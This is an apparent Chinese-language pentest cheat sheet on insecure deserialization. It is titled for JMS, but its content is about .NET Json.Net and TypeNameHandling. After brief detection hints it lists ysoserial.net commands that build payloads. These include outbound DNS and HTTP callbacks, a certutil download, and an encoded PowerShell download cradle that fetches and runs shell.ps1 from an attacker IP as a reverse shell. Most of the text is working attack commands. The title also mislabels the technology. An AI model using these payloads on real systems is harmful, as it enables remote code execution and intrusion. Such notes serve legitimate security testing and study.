# JMS反序列化漏洞

## 检测

1.白盒

+ TypeNameHandling
+ JavaScriptTypeResolver

2.黑盒

搜索应针对 Base64 编码的字符串 AAEAAAD///// 或可能在服务器端进行反序列化的任何类似模式，从而授予对要反序列化的类型的控制

这可能包括但不限于具有 TypeObject 或 $type 的 JSON 或 XML 结构

## 工具

[ysoserial Net](https://github.com/pwntester/ysoserial.net)

```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
